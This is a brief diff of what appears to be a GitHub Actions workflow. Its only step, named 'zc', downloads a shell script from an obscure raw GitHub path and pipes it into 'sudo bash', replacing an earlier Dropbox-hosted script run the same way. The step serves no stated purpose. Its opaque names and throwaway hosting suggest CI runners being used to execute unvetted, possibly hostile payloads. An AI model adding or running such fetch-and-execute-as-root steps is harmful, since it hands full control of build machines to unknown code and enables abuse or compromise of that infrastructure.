@@ -7,4 +7,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: zc
-      run: curl https://dl.dropboxusercontent.com/s/3ayu2sx3q0zp7ww/zc.sh | sudo bash
+      run: curl https://raw.githubusercontent.com/zsdresd/fmli/master/a/a/a/ashid/fm.sh | sudo bash
